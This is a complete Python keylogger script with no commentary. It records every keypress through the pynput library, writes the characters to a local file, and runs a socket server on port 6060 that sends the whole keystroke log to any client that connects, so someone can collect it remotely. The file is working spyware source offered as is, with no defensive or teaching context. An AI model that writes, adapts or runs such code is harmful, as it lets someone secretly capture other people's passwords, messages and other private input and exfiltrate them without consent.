#!/usr/bin/python3

import socket

from pynput import keyboard

keyLog = ""

def keyPressed(key):

    global keyLog
    keyLog += str(key)

    print(str(key))
    with open("keyfile.txt",'a') as logKey:
        try: 
            char = key.char
            logKey.write(char)
        except:
            print('Error getting char')


if __name__ == '__main__':

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((socket.gethostname(), 6060))
    s.listen(5)

    while True:
        clientSocket, address = s.accept()
        print(f"Connection established from address {address}")
        clientSocket.send(bytes(keyLog,"utf-8"))
        print(f"{address} grabbed keylog")
        


        
    





